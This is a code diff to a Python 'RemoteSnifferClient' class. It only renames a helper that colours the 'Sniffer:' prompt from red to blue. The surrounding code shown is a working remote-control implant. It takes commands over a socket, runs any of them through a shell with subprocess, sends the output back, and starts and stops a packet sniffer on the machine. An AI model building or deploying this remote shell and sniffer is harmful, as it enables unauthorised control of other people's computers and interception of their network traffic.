@@ -25,8 +25,8 @@ class RemoteSnifferClient:
         self.sniffer = RemoteSniffer(self.host)
 
 
-    # format text to bold and red 
-    def convert_text_bold_red(self, text):
+    # format text to bold and blue 
+    def convert_text_bold_blue(self, text):
             RESET = "\033[0m"
             BOLD = "\033[1m"
             COLOR = "\u001b[36m"
@@ -67,7 +67,7 @@ class RemoteSnifferClient:
             cmd = self.sock1.recv(4096).decode()
 
             if cmd == " ":
-                response = f"{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                response = f"{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                 self.sock1.send(response.encode())
 
 
@@ -81,12 +81,12 @@ class RemoteSnifferClient:
                     if "The system cannot find the path specified." in output_data:
                         output_data = "\n"
 
-                    response = f"{output_data}\n{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    response = f"{output_data}\n{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                     self.sock1.send(response.encode())
                 
                 except (FileNotFoundError, IOError):
                     error_message = "Directory does not exist!!! \n"
-                    response = f"{error_message}{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    response = f"{error_message}{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                     self.sock1.send(response.encode())
 
 
@@ -99,12 +99,12 @@ class RemoteSnifferClient:
                     capture_thread.start()
                     capture_handle_thread.start()
 
-                    response = f"[+]Packet Sniffer has been started!!!\n{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    response = f"[+]Packet Sniffer has been started!!!\n{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                     self.sock1.send(response.encode())
                    
                 except Exception as e:
                     error_message = f"{e} \n"
-                    response = f"{error_message}{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    response = f"{error_message}{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                     self.sock1.send(response.encode())
 
             elif cmd == "stop sniffer":
@@ -114,14 +114,14 @@ class RemoteSnifferClient:
                     capture_handle_thread.join()
 
 
-                    response = f"[+]Packet Sniffer has stopped!!!\n{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    response = f"[+]Packet Sniffer has stopped!!!\n{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                     self.sock1.send(response.encode())
 
                     self.sniffer.resume()
                    
                 except Exception as e:
                     error_message = f"{e} \n"
-                    response = f"{error_message}{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    response = f"{error_message}{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                     self.sock1.send(response.encode())
 
             else:
@@ -129,11 +129,11 @@ class RemoteSnifferClient:
                     terminal_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
 
-                    output_data = terminal_output.decode() + "\n" + self.convert_text_bold_red("Sniffer: ") + os.getcwd() + ": "
+                    output_data = terminal_output.decode() + "\n" + self.convert_text_bold_blue("Sniffer: ") + os.getcwd() + ": "
                     self.sock1.send(output_data.encode()) 
 
                 except Exception as e:
-                    error_message = f"{e}\n{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    error_message = f"{e}\n{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                     self.sock1.send(error_message.encode()) 
 
 
